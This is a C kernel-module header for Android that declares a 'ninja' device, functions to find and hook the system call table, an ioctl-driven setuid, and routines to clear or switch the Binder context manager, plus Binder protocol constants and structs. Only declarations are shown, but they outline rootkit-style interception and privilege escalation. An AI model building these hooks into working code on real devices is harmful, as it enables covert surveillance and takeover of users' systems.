#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/ioctl.h>

#define IOCTL_UID 0
#define IOCTL_SYS_CALL 1
#define IOCTL_CLR_CTX_MNG 2
#define IOCTL_LOG_STRING 3
#define IOCTL_LOG_INT 4
#define IOCTL_SWT_CTX_MNG 5

#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_IOCTL 54

#define BINDER_WRITE_READ -1072143871
#define BR_NOOP 29196
#define BC_REPLY 1076388609
#define BC_FREE_BUFFER 1074029315
#define BC_TRANSACTION 1076388608

int init_module(void);
void cleanup_module(void);

int ninja_open(struct inode *, struct file *);
int ninja_ioctl(struct inode *, struct file *, unsigned int, unsigned long);
int ninja_release(struct inode *, struct file *);

static struct file_operations fops = {
	.open = ninja_open,
	.ioctl = ninja_ioctl,
	.release = ninja_release
};

void get_sys_call_table(void);
int setuid(int);
void hook_syscall(int);
void clear_ctx_mgr(void);
void stringlog(char *);
void intlog(int);
void switch_ctx_mgr(void);

asmlinkage ssize_t (*orig_read) (int, char *, size_t);
asmlinkage ssize_t (*orig_write) (int, char *, size_t);
asmlinkage ssize_t (*orig_open) (const char *, int);
asmlinkage ssize_t (*orig_close) (int);
asmlinkage ssize_t (*orig_ioctl) (unsigned int, unsigned int, unsigned long);

asmlinkage ssize_t our_read (int, char *, size_t);
asmlinkage ssize_t our_write (int, char *, size_t);
asmlinkage ssize_t our_open(const char *, int);
asmlinkage ssize_t our_close(int);
asmlinkage ssize_t our_ioctl(unsigned int, unsigned int, unsigned long);

struct binder_write_read {
	signed long	write_size;	
	signed long	write_consumed;	
	unsigned long	write_buffer;
	signed long	read_size;	
	signed long	read_consumed;	
	unsigned long	read_buffer;
};

struct binder_txn {
    void *target;
    void *cookie;
    uint32_t code;
    uint32_t flags;

    uint32_t sender_pid;
    uint32_t sender_euid;

    uint32_t data_size;
    uint32_t offs_size;
    void *data;
    void *offs;
};

struct binder_io
{
    char *data;            /* pointer to read/write from */
    uint32_t *offs;        /* array of offsets */
    uint32_t data_avail;   /* bytes available in data buffer */
    uint32_t offs_avail;   /* entries available in offsets array */

    char *data0;           /* start of data buffer */
    uint32_t *offs0;       /* start of offsets buffer */
    uint32_t flags;
    uint32_t unused;
};

#define BIO_F_SHARED    0x01
#define BIO_F_OVERFLOW  0x02
